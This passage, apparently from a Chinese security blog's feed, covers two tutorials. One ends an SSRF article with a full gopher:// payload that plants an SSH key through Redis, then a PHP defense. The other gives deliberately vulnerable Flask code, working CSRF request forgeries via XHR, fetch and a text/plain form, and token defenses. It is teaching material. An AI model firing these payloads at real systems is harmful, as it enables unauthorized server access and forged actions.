class="string">'http://127.0.0.1/ssrf.php?url=gopher://192.168.70.129:6379/_%2A3%250d%250a%243%250d%250aset%250d%250a%243%250d%250atmp%250d%250a%24413%250d%250a%250a%250a%250a%250assh-rsa%2520AAAAB3NzaC1yc2EAAAADAQABAAABAQDNPLyFJPazctB0%2BJAWQ8%2B5pNIOlGMYLmTupLXT5EjFkEDzKhkGu8l%2BC4ja/s4IIoMBtoxDPcogMLRFtxWv%2BA6WIvFQhAsqcaDBl48mXmsiHtKJbooNLplu/fTvdSjisnaF8Qsa/zRSWubPSfzzz5ObhsLhpXD/hcMofUZxofbysT0yWhmlTdC7i2GDIxlZPlSdpAxwPo0BgaP5GO/6GQ49GC4niw5j2UTAqBDQWqwWww5yxNXU/iY9YY83MUbMpuUlLgmpne1lFhY2jQ69uPiVPKUWWHPcNHgIeNqVAoTCFXSvjVgnDu/iHQSkm0o0uW/who12xgxAOXm3MU1cX9gL%2520anemone%40DESKTOP-ANEMONE%250a%250a%250a%250a%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2410%250d%250a/root/.ssh%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%2415%250d%250aauthorized_keys%250d%250a%2A2%250d%250a%243%250d%250aget%250d%250a%243%250d%250atmp%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a'</span></span><br></pre></td></tr></table></figure><p>返回5个<code>+OK</code>表示写入成功：</p><p><img src="/ssrf-SSRF成因、攻击和防御/1549509436064.png" alt="1549509436064"></p><p>可以看到远程服务器上的公钥已经写入：</p><p><img src="/ssrf-SSRF成因、攻击和防御/1549459966337.png" alt="1549459966337"></p><p>ssh可以登录：</p><p><img src="/ssrf-SSRF成因、攻击和防御/1549459989638.png" alt="1549459989638"></p><h1 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h1><p>考虑到以上的各种绕过，产生如下基本思路（参考p神的<a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html" target="_blank" rel="noopener">谈一谈如何在Python开发中拒绝SSRF漏洞</a>）：</p><ol><li><p><strong>只允许http或https协议</strong></p></li><li><p>解析目标URL，获取其host</p></li><li><p>解析host，获取host指向的IP地址转换成long型</p></li><li><p><strong>检查IP地址是否为内网IP</strong></p></li><li><p>请求URL</p></li><li><p>如果有跳转，拿出跳转URL，执行1(或者直接进用302跳转)，否则返回页面结果</p></li></ol><p>参考<a href="https://www.jianshu.com/p/6ea9b8652d73" target="_blank" rel="noopener">PHP开发中防御SSRF</a>给出php的实现（Python实现请看<a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html" target="_blank" rel="noopener">谈一谈如何在Python开发中拒绝SSRF漏洞</a>）<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">    $ch = CURL_INIT();</span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_HEADER, <span class="keyword">FALSE</span>);</span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">TRUE</span>);</span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">FALSE</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">        <span class="comment">// 0.判断URL合法性</span></span><br><span class="line">        <span class="keyword">if</span> (!$url || !filter_var($url, FILTER_VALIDATE_URL, FILTER_FLAG_PATH_REQUIRED &amp; FILTER_FLAG_HOST_REQUIRED &amp; FILTER_FLAG_QUERY_REQUIRED))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.仅允许http或https协议</span></span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^https?:\/\/.*$/'</span>, $url))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.解析目标URL，获取其host</span></span><br><span class="line">        $host = parse_url($url, PHP_URL_HOST);</span><br><span class="line">        <span class="keyword">if</span>(!$host)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.解析host，获取host指向的IP地址</span></span><br><span class="line">        $ip = gethostbyname($host);</span><br><span class="line">        $ip = ip2long($ip);</span><br><span class="line">        <span class="keyword">if</span>($ip === <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4.检查IP地址是否为内网IP</span></span><br><span class="line">        $is_inner_ipaddress = ip2long(<span class="string">'127.0.0.0'</span>) &gt;&gt; <span class="number">24</span> == $ip &gt;&gt; <span class="number">24</span> <span class="keyword">or</span></span><br><span class="line">            ip2long(<span class="string">'10.0.0.0'</span>) &gt;&gt; <span class="number">24</span> == $ip &gt;&gt; <span class="number">24</span> <span class="keyword">or</span></span><br><span class="line">            ip2long(<span class="string">'172.16.0.0'</span>) &gt;&gt; <span class="number">20</span> == $ip &gt;&gt; <span class="number">20</span> <span class="keyword">or</span></span><br><span class="line">            ip2long(<span class="string">'192.168.0.0'</span>) &gt;&gt; <span class="number">16</span> == $ip &gt;&gt; <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">if</span>($is_inner_ipaddress)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5.请求URL</span></span><br><span class="line">        CURL_SETOPT($ch, CURLOPT_URL, $url);</span><br><span class="line">        $res = CURL_EXEC($ch);</span><br><span class="line">        $code = curl_getinfo($ch,CURLINFO_HTTP_CODE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6.如果有跳转，获取跳转URL执行1, 否则返回响应</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">300</span>&lt;=$code <span class="keyword">and</span> $code&lt;<span class="number">400</span>)&#123;</span><br><span class="line">            $headers = curl_getinfo($ch);</span><br><span class="line">            $url=$headers[<span class="string">"redirect_url"</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            CURL_CLOSE($ch) ;</span><br><span class="line">            <span class="keyword">return</span> $res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">    <span class="comment">// $url="http://localhost:8888/302.php";</span></span><br><span class="line">    $res=safe_request($url);</span><br><span class="line">    <span class="keyword">if</span>($res)</span><br><span class="line">        <span class="keyword">echo</span> var_dump($res);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>SSRF漏洞分析与利用，<a href="http://www.91ri.org/17111.html" target="_blank" rel="noopener">http://www.91ri.org/17111.html</a></li><li>SSRF漏洞(原理&amp;绕过姿势)，<a href="https://www.t00ls.net/articles-41070.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-41070.html</a></li><li>SSRF Tips，<a href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/" target="_blank" rel="noopener">http://blog.safebuff.com/2016/07/03/SSRF-Tips/</a></li><li>谈一谈如何在Python开发中拒绝SSRF漏洞，<a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html" target="_blank" rel="noopener">https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html</a></li><li>PHP开发中防御SSRF，<a href="https://www.jianshu.com/p/6ea9b8652d73" target="_blank" rel="noopener">https://www.jianshu.com/p/6ea9b8652d73</a></li><li>SSRF in the Wild, <a href="https://medium.com/swlh/ssrf-in-the-wild-e2c598900434" target="_blank" rel="noopener">https://medium.com/swlh/ssrf-in-the-wild-e2c598900434</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SSRF成因&quot;&gt;&lt;a href=&quot;#SSRF成因&quot; class=&quot;headerlink&quot; title=&quot;SSRF成因&quot;&gt;&lt;/a&gt;SSRF成因&lt;/h1&gt;&lt;p&gt;SSRF是指存在漏洞的服务器存在对外发起请求的功能，而请求源可由攻击者控制并且服务器本身没有做合法验证，诸如
      
    
    </summary>
    
      <category term="Web安全-SSRF" scheme="http://anemone.top/categories/Web%E5%AE%89%E5%85%A8-SSRF/"/>
    
    
      <category term="PHP" scheme="http://anemone.top/tags/PHP/"/>
    
      <category term="SSRF" scheme="http://anemone.top/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>CSRF成因、攻击和防御</title>
    <link href="http://anemone.top/csrf-CSRF%E6%88%90%E5%9B%A0%E3%80%81%E6%94%BB%E5%87%BB%E5%92%8C%E9%98%B2%E5%BE%A1/"/>
    <id>http://anemone.top/csrf-CSRF成因、攻击和防御/</id>
    <published>2019-02-04T12:24:21.000Z</published>
    <updated>2019-09-22T10:14:18.603Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CSRF成因"><a href="#CSRF成因" class="headerlink" title="CSRF成因"></a>CSRF成因</h1><h2 id="GET型"><a href="#GET型" class="headerlink" title="GET型"></a>GET型</h2><h3 id="脆弱代码"><a href="#脆弱代码" class="headerlink" title="脆弱代码"></a>脆弱代码</h3><p>存在CSRF的GET型请求如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/get', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">'user'</span>,<span class="string">''</span>)==<span class="string">'admin'</span>:</span><br><span class="line">        ret = <span class="string">"Admin do something!"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ret = <span class="string">"No Privilege..."</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    user=request.args.get(<span class="string">"user"</span>, <span class="string">"Null"</span>)</span><br><span class="line">    session[<span class="string">"user"</span>]=user</span><br><span class="line">    template=<span class="string">"""</span></span><br><span class="line"><span class="string">    &lt;h3&gt; Login as &#123;&#123; user &#125;&#125;... &lt;/h3&gt;</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, user=user)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'127.0.0.1'</span>, port=<span class="number">8888</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>先使用<a href="http://127.0.0.1:8888/login?user=admin模拟用户admin登陆，从代码可以看到登陆后网站将用户身份（简单起见就是用户名）保存到session中。" target="_blank" rel="noopener">http://127.0.0.1:8888/login?user=admin模拟用户admin登陆，从代码可以看到登陆后网站将用户身份（简单起见就是用户名）保存到session中。</a><br><img src="/csrf-CSRF成因、攻击和防御/1549283807815.png" alt="1549283807815"></p><p>接着访问<a href="http://127.0.0.1:8888/get可以看到用户具有这一权限，可以进行操作（假设这一链接是一个关键操作，如重置密码或泄露其他敏感信息的操作）。" target="_blank" rel="noopener">http://127.0.0.1:8888/get可以看到用户具有这一权限，可以进行操作（假设这一链接是一个关键操作，如重置密码或泄露其他敏感信息的操作）。</a></p><p><img src="/csrf-CSRF成因、攻击和防御/1549284215038.png" alt="1549284215038"></p><h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>如果用户访问了恶意网页，恶意网页诱导用户访问<a href="http://127.0.0.1:8888/get或是用js发送一个get请求，那么用户由于sessionID还存在于浏览器中，因此会在无意间使用自己的身份重置密码，如用于访问了如下内容的网页：" target="_blank" rel="noopener">http://127.0.0.1:8888/get或是用js发送一个get请求，那么用户由于sessionID还存在于浏览器中，因此会在无意间使用自己的身份重置密码，如用于访问了如下内容的网页：</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>AJAX<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">    xhr.open(<span class="string">"GET"</span>, <span class="string">"http://127.0.0.1:8888/get"</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">    xhr.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line">    xhr.send();</span><br><span class="line"><span class="javascript">    xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(xhr.readyState === <span class="number">4</span> &amp;&amp; xhr.status === <span class="number">200</span>)&#123;</span></span><br><span class="line">            alert(xhr.responseText);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>尽管同源策略导致js拿不到结果，但是请求仍然会正常发送：</p><p><img src="/csrf-CSRF成因、攻击和防御/1549284680614.png" alt="1549284680614"></p><h2 id="POST-表单型"><a href="#POST-表单型" class="headerlink" title="POST 表单型"></a>POST 表单型</h2><h3 id="脆弱代码-1"><a href="#脆弱代码-1" class="headerlink" title="脆弱代码"></a>脆弱代码</h3><p>有人认为CSRF产生的原因是因为GET请求类型造成的，其实不然，如下就是一个POST类型的代码，它同样存在CSRF问题：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/post', methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        template=<span class="string">"""</span></span><br><span class="line"><span class="string">        &lt;form action="http://127.0.0.1:8888/reset" method="POST"&gt;</span></span><br><span class="line"><span class="string">        &lt;input name="action" type="text"&gt;</span></span><br><span class="line"><span class="string">        &lt;input type="submit"&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> render_template_string(template)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(request.form)</span><br><span class="line">        data=request.form[<span class="string">"action"</span>]</span><br><span class="line">        print(<span class="string">"session:"</span>,session)</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">'user'</span>,<span class="string">''</span>)==<span class="string">'admin'</span>:</span><br><span class="line">            print(<span class="string">"Admin do"</span>, data)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Admin do "</span>+data</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"No Privilege2..."</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"No Privilege2..."</span></span><br></pre></td></tr></table></figure></p><h3 id="攻击方法-1"><a href="#攻击方法-1" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>攻击者只需要同样的伪造POST表单即可，这里我们换用<code>fetch()</code>试一下，当然<code>XMLHttpRequest()</code>也可以。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">'http://127.0.0.1:8888/post'</span>,&#123;<span class="attr">method</span>: <span class="string">'POST'</span>, <span class="attr">credentials</span>: <span class="string">'include'</span>, <span class="attr">headers</span>:&#123;<span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>&#125;, <span class="attr">body</span>:<span class="string">'action=reset+password'</span>&#125;)</span><br></pre></td></tr></table></figure><p>尽管同源再一次没让我们拿到结果，但是请求还是发过去了：</p><p><img src="/csrf-CSRF成因、攻击和防御/1549285932946.png" alt="1549285932946"></p><h2 id="POST-JSON型"><a href="#POST-JSON型" class="headerlink" title="POST JSON型"></a>POST JSON型</h2><p>如果服务器严格限制了<code>Content-Type=application/json</code>，理论上是不存在CSRF的，因为该请求属于非简单请求，非简单请求会发先检请求确认是否允许跨域，如果不允许跨域的话js就没法使用cookie。</p><p>但是若服务器不判断content-type，那么攻击者就可以使用表单或是js伪造一个<code>Content-Type=text/plain</code>的请求。</p><h3 id="脆弱代码-2"><a href="#脆弱代码-2" class="headerlink" title="脆弱代码"></a>脆弱代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/json', methods=['GET','POST','OPTIONS'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_json</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        template=<span class="string">"""</span></span><br><span class="line"><span class="string">        &lt;script type="text/javascript"&gt;</span></span><br><span class="line"><span class="string">        function submitRequest() &#123;</span></span><br><span class="line"><span class="string">            var xhr = new XMLHttpRequest();</span></span><br><span class="line"><span class="string">            xhr.open("POST", "http://127.0.0.1:8888/json", true);</span></span><br><span class="line"><span class="string">            xhr.setRequestHeader("Accept", "*/*");</span></span><br><span class="line"><span class="string">            xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3");</span></span><br><span class="line"><span class="string">            xhr.setRequestHeader("Content-Type", "application/json; charset=utf-8");</span></span><br><span class="line"><span class="string">            xhr.withCredentials = true;</span></span><br><span class="line"><span class="string">            xhr.send(JSON.stringify(&#123;"action":"change passwd..."&#125;));</span></span><br><span class="line"><span class="string">            xhr.onreadystatechange = function()&#123;</span></span><br><span class="line"><span class="string">                if(xhr.readyState === 4 &amp;&amp; xhr.status === 200)&#123;</span></span><br><span class="line"><span class="string">                    alert(xhr.responseText);</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &lt;button onclick="submitRequest()"&gt;Conform&lt;/button&gt;</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> render_template_string(template)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">'user'</span>,<span class="string">''</span>)==<span class="string">'admin'</span>:</span><br><span class="line">            data=json.loads(request.get_data(as_text=<span class="literal">True</span>))</span><br><span class="line">            ret=<span class="string">'Admin do '</span>+data[<span class="string">"action"</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ret=<span class="string">"No Privilege2..."</span></span><br><span class="line">        <span class="keyword">return</span> ret</span><br></pre></td></tr></table></figure><h3 id="攻击方法-2"><a href="#攻击方法-2" class="headerlink" title="攻击方法"></a>攻击方法</h3><ol><li><p>使用表单伪造post，关键是用name字段构造一个合法的json：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1:8888/json"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"text/plain"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">'&#123;"action":"change passwd...", "test":"'</span> <span class="attr">value</span>=<span class="string">'test"&#125;'</span> <span class="attr">type</span>=<span class="string">'hidden'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>使用js伪造post json</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">'http://127.0.0.1:8888/json'</span>,&#123;<span class="attr">method</span>: <span class="string">'POST'</span>, <span class="attr">credentials</span>: <span class="string">'include'</span>, <span class="attr">headers</span>:&#123;<span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span>&#125;, <span class="attr">body</span>:<span class="string">'&#123;"action":"reset password"&#125;'</span>&#125;)</span><br></pre></td></tr></table></figure></li></ol><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>主要有两种手段：</p><ol><li>根据Referer判断，但是要考虑没有referer字段的情况</li><li>增加一个随机的Token，前端发送后，后端比较是否一致，本文主要介绍这一种方法</li></ol><h2 id="GET型-1"><a href="#GET型-1" class="headerlink" title="GET型"></a>GET型</h2><p>在产生GET请求的地方就加一个csrf_token，在处理get请求时判断csrf_token与cookie或session中的token是否一致。</p><h2 id="POST表单型"><a href="#POST表单型" class="headerlink" title="POST表单型"></a>POST表单型</h2><p>对于flask，使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_wtf.csrf <span class="keyword">import</span> CSRFProtect</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'you never guess'</span></span><br><span class="line">CSRFProtect(app)</span><br></pre></td></tr></table></figure><p>打开csrf保护，接着再对所有的表单添加一个隐藏字段即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"csrf_token"</span> <span class="attr">value</span>=<span class="string">"&#123;&#123; csrf_token() &#125;&#125;"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>增加隐藏字段后，每次POST时都会带有一个csrf_token，攻击者由于同源策略是无法获取这个token的，另外token写进session里面，即session和token是一对一关系，因此攻击者也无法通过自己的token猜测别人的token，而服务器再POST请求过来时就会验证这个token是否与session一致，若不一致则拒绝服务，这样一来攻击者就无法攻击成功了（除了把token放表单里，还可以放cookie里，攻击者仍然无法获取）</p><h2 id="POSTJSON型"><a href="#POSTJSON型" class="headerlink" title="POSTJSON型"></a>POSTJSON型</h2><p>理论上严格控制<code>content-type: application/json</code>就能解决问题，当然也可以用通用方法：</p><p>同样还是先开启CSRF防御：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_wtf.csrf <span class="keyword">import</span> CSRFProtect</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'random_secret_key'</span></span><br><span class="line">CSRFProtect(app)</span><br></pre></td></tr></table></figure><p>让自己站的ajax拿到csrf_token，就像之前说的，将token放进cookie里，使用app.after_request修饰使得每个页面返回时都执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">after_request</span><span class="params">(response)</span>:</span></span><br><span class="line">    <span class="comment"># 调用函数生成 csrf_token</span></span><br><span class="line">    csrf_token = generate_csrf()</span><br><span class="line">    <span class="comment"># 通过 cookie 将值传给前端</span></span><br><span class="line">    response.set_cookie(<span class="string">"csrf_token"</span>, csrf_token)</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><p>接着ajax从cookie拿到token并放到headers里，不用担心攻击者，因为由于同源策略，他们没法获取其他网站的cookie：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/json2', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 